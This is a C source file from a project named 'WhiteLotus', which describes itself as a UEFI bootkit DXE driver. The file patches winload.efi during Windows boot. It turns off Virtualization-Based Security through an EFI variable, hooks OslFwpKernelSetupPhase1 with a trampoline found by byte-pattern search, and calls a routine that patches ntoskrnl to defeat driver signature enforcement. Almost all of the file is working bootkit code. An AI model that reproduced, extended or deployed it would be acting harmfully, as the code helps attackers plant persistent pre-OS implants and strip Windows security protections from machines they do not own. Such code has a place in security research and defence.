/*
 * ============================================================
 *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
 *  File     : PatchWinload.c
 * ============================================================
 *
 *  Description:
 *    Patches winload.efi to disable Virtualization-Based
 *    Security (VBS) by setting the VbsPolicyDisabled EFI
 *    variable, then locates OslFwpKernelSetupPhase1 via byte-
 *    pattern search and installs a trampoline hook. The hook
 *    fires after the kernel is loaded into memory and triggers
 *    the ntoskrnl DSE patch before handing off to Windows.
 *
 *  Purpose:
 *    - Chain from winload.efi into the kernel patcher at the
 *      correct point in the boot sequence.
 *    - Disable VBS/HyperGuard before kernel initialization.
 *
 *  Author   : 0xbekoo
 *  Blog     : https://0xbekoo.github.io
 *  Updated  : 2026-05-21
 *
 * ============================================================
 */

#include "PatchWinload.h"

// Kernel patch information structure
// Stores the patched kernel base address and status
KERNEL_PATCH_INFORMATION gKernelPatchInfo = {
    .Status = 0,
    .BufferSize = 0,
    .Buffer = { 0 },
    .WinloadBuildNumber = 0,
    .KernelBuildNumber = 0,
    .KernelBase = NULL
};

// Hook: Intercept OslFwpKernelSetupPhase1 during boot
// Patches ntoskrnl.exe before Windows kernel starts
EFI_STATUS EFIAPI HookedOslFwpKernelSetupPhase1(IN PLOADER_PARAMETER_BLOCK LoaderBlock) {
  DEBUG((DEBUG_INFO, "[WhiteLotus] OslFwpKernelSetupPhase 1 was hooked!\n"));

  UINT8* LoadOrderListHeadAddress = (UINT8*)&LoaderBlock->LoadOrderListHead;
  CONST PKLDR_DATA_TABLE_ENTRY KernelEntry = GetBootLoadedModule((LIST_ENTRY*)LoadOrderListHeadAddress, L"ntoskrnl.exe");
  if (NULL == KernelEntry) {
    DEBUG((DEBUG_ERROR, "[WhiteLotus] Failed to find ntoskrnl.exe!\n"));
    goto Exit;
  }

  VOID* KernelBase = KernelEntry->DllBase;
  CONST UINT32 KernelSize = KernelEntry->SizeOfImage;
  if (KernelBase == NULL || KernelSize == 0)
  {
    gKernelPatchInfo.Status = EFI_NOT_FOUND;
    DEBUG((DEBUG_INFO, "[WhiteLotus] Kernel image at 0x%p with size 0x%lx is invalid!\r\n", KernelBase, KernelSize));
    goto Exit;
  }
  DEBUG((DEBUG_INFO, "[WhiteLotus] Kernel image at %p with size: 0x%lx\n", KernelBase, KernelSize));

  gKernelPatchInfo.KernelBase = KernelBase;
  CONST PEFI_IMAGE_NT_HEADERS NtHeaders = KernelBase != NULL && KernelSize > 0 ? RtlpImageNtHeaderEx(KernelBase, (UINTN)KernelSize) : NULL;
  gKernelPatchInfo.Status = PatchNtoskrnl(KernelBase, NtHeaders);

Exit:
  // Restore the original function before calling it
  CopyWpMem((VOID*)gOriginalOslFwpKernelSetupPhase1, gOslFwpKernelSetupPhase1Backup, sizeof(gHookTemplate));
  return gOriginalOslFwpKernelSetupPhase1(LoaderBlock);
}

// Locate OslFwpKernelSetupPhase1 function in winload.efi
// Searches for the function signature in the .text and .rdata sections
EFI_STATUS EFIAPI FindOslFwpKernelSetupPhase1(
  IN CONST UINT8* ImageBase,
  IN PEFI_IMAGE_NT_HEADERS NtHeaders,
  IN PEFI_IMAGE_SECTION_HEADER CodeSection,
  IN PEFI_IMAGE_SECTION_HEADER PatternSection,
  IN UINT16 BuildNumber,
  OUT UINT8** OslFwpKernelSetupPhase1Address
) {
  *OslFwpKernelSetupPhase1Address = NULL;
  CONST UINT8* CodeStartVa = ImageBase + CodeSection->VirtualAddress;
  CONST UINT32 CodeSizeOfRawData = CodeSection->SizeOfRawData;
  UINT8* Found = NULL;

  EFI_STATUS Status = FindPattern(SigOslFwpKernelSetupPhase1, 0xCC, sizeof(SigOslFwpKernelSetupPhase1), (VOID*)CodeStartVa, \
                        CodeSizeOfRawData, (VOID**)&Found);
  if (EFI_ERROR(Status)) {
    Print(L"Failed to find OslFpwKernelSetupPhase1!\n");
  }

  // Locate OslFwpKernelSetupPhase1 function start address
  *OslFwpKernelSetupPhase1Address = FindFunctionStart(ImageBase, NtHeaders, Found);
  if (NULL == OslFwpKernelSetupPhase1Address) {
    Print(L"Failed to find the start of OslFwpKernelSetupPhase1!\n");
  }
  return Status;
}

// Disable Virtualization-Based Security (VBS) by setting the VbsPolicyDisabled EFI variable
// This ensures HyperGuard and other VBS features are disabled for this boot session
STATIC EFI_STATUS EFIAPI DisableVbs(VOID) {
  CONST BOOLEAN Disabled = TRUE;
  UINT32 Attributes;
  UINTN Size = 0;

  // Clear existing VbsPolicyDisabled variable if it exists and has different attributes
  EFI_STATUS Status = gRT->GetVariable((CHAR16*)VbsPolicyDisabledVariableName, (EFI_GUID*)&MicrosoftVendorGuid, \
                  &Attributes, &Size, NULL);
  if (Status != EFI_NOT_FOUND && (Attributes != (EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS) || Size != sizeof(Disabled))) {
    gRT->SetVariable((CHAR16*)VbsPolicyDisabledVariableName, (EFI_GUID*)&MicrosoftVendorGuid, 0, 0, NULL);
  }

  // Set VbsPolicyDisabled to TRUE (non-volatile, boot service accessible)
  Status = gRT->SetVariable((CHAR16*)VbsPolicyDisabledVariableName, (EFI_GUID*)&MicrosoftVendorGuid, \
            EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS, sizeof(Disabled), (BOOLEAN*)&Disabled);
  return Status;
}

// Patch winload.efi to disable DSE and prepare for kernel patching
// Entry point for winload patching logic
EFI_STATUS EFIAPI PatchWinload(
    CONST VOID* ImageBase,
    PEFI_IMAGE_NT_HEADERS NtHeaders
) {
  // Simple Banner
  Print(L"WhiteLotus by 0xbekoo...\n");

  UINT16 MajorVersion = 0, MinorVersion = 0, BuildNumber = 0, Revision = 0;
  EFI_STATUS Status;

  // Get file version information for logging
  Status = GetPeFileVersionInfo(ImageBase, &MajorVersion, &MinorVersion, &BuildNumber, &Revision, NULL);
  if (EFI_ERROR(Status)) {
    Print(L"\r\nFailed to obtain winload.efi version info. Status: %llx\r\n", Status);
  }
  gKernelPatchInfo.WinloadBuildNumber = BuildNumber;
  DEBUG((DEBUG_INFO, "\r\nPatching winload.efi v%u.%u.%u.%u...\r\n", MajorVersion, MinorVersion, BuildNumber, Revision));

  // Locate .text and .rdata sections for pattern searching
  PEFI_IMAGE_SECTION_HEADER CodeSection = NULL, PatternSection = NULL;
  PEFI_IMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeaders);

  for (UINT16 i = 0; i < NtHeaders->FileHeader.NumberOfSections; ++i)
  {
    CHAR8 SectionName[EFI_IMAGE_SIZEOF_SHORT_NAME + 1];
    CopyMem(SectionName, Section->Name, EFI_IMAGE_SIZEOF_SHORT_NAME);
    SectionName[EFI_IMAGE_SIZEOF_SHORT_NAME] = '\0';

    if (AsciiStrCmp(SectionName, ".text") == 0) {
      CodeSection = Section;
    } else if (AsciiStrCmp(SectionName, ".rdata") == 0) {
      PatternSection = Section;
    }
    Section++;
  }

  // Get BlStatusPrint function pointer (used for debug output)
  // First try exported function, then fallback to pattern search
  gBlStatusPrint = (t_BlStatusPrint)GetProcedureAddress((UINTN)ImageBase, NtHeaders, "BlStatusPrint");
  if (NULL == gBlStatusPrint) {
    FindPattern(SigBlStatusPrint, 0xCC, sizeof(SigBlStatusPrint), (UINT8*)ImageBase + CodeSection->VirtualAddress, \
              CodeSection->SizeOfRawData, (VOID**)&gBlStatusPrint);
    if (NULL == gBlStatusPrint) {
      Print(L"BlStatusPrint was not found! Check your win version!\n");
      return EFI_NOT_FOUND;
    }
  }

  // Disable VBS for this boot session
  Status = DisableVbs();
  if (EFI_ERROR(Status)) {
    Print(L"\r\nWARNING: failed to set EFI runtime variable \"%ls\" in order to disable VBS.\r\n", VbsPolicyDisabledVariableName);
  }

  // Find OslFwpKernelSetupPhase1 to install our hook
  Status = FindOslFwpKernelSetupPhase1(ImageBase, NtHeaders, CodeSection, PatternSection, \
        BuildNumber, (UINT8**)&gOriginalOslFwpKernelSetupPhase1);
  if (EFI_ERROR(Status)) {
    Print(L"Failed to find OslFwpKernelSetupPhase1!\n");
  }

  // Install the hook
  CONST UINTN HookedOslFwpKernelSetupPhase1Address = (UINTN)&HookedOslFwpKernelSetupPhase1;
  DEBUG((DEBUG_INFO, "HookedOslFwpKernelSetupPhase1 at 0x%p.\r\n", (VOID*)HookedOslFwpKernelSetupPhase1Address));

  // Raise TPL to prevent interruption during memory writes
  CONST EFI_TPL Tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);
  // Backup original bytes for restoration
  CopyMem(gOslFwpKernelSetupPhase1Backup, (VOID*)gOriginalOslFwpKernelSetupPhase1, sizeof(gHookTemplate));

  // Write hook template to target function
  CopyWpMem((VOID*)gOriginalOslFwpKernelSetupPhase1, gHookTemplate, sizeof(gHookTemplate));
  // Write hook address at offset within the template
  CopyWpMem((UINT8*)gOriginalOslFwpKernelSetupPhase1 + gHookTemplateAddressOffset,
    (UINTN*)&HookedOslFwpKernelSetupPhase1Address, sizeof(HookedOslFwpKernelSetupPhase1Address));

  gBS->RestoreTPL(Tpl);
  DEBUG((DEBUG_INFO, "Successfully patched winload!OslFwpKernelSetupPhase1.\r\n"));
  return EFI_SUCCESS;
}
